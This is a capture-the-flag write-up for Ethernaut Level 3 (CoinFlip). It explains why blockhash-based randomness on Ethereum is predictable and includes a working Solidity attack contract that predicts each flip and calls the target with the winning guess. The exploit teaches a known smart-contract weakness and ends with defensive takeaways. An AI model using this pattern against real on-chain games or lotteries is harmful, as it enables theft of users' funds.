<div align="center">

<img src="../assets/levels/3-coinflip.webp" width="600px"/>
<br><br>
<h1><strong>Ethernaut Level 3 - Coinflip</strong></h1>

</div>

## Objectif

<img src="../assets/requirements/3-coinflip-requirements.webp" width="800px"/>

## The hack

Everything in the EVM is deterministic. This means that entropy doesn't exist natively on-chain (you can use third party solutions like [Chainlink VRF](https://docs.chain.link/vrf/)).
The logic used in the `CoinFlip` contract is only pseudo-random. So we can predict the next flip by using the same logic as the one in the contract.
Once done, we can call the `flip` function with the predicted value and repeat this 10 times to win the level.

## Solution

We can craft a smart contract that reproduce the same logic as the `CoinFlip` contract to predict the next flip and call the `flip` function with the predicted value.

```javascript
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

interface ICoinFlip {
    function flip(bool) external returns (bool);
}

contract Unflip {
    address constant coinflip = 0xb721D5C58B4B2d7Fc82084541C639A6b6E3CBf73; // Replace with your CoinFlip instance
    uint256 FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;

    function playToWin() private view returns (bool) {
        uint256 pastBlockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlipResult = pastBlockValue / FACTOR;
        return coinFlipResult == 1 ? true : false;
    }

    function attack() public {
        ICoinFlip(coinflip).flip(playToWin());
    }
}
```

## Takeaway

- Entropy doesn't exist on-chain
- Pseudo randomness can help for development but not for security
- To read: https://github.com/ethereumbook/ethereumbook/blob/develop/09smart-contracts-security.asciidoc#entropy-illusion

<div align="center">
<br>
<h2>🎉 Level completed! 🎉</h2>
</div>
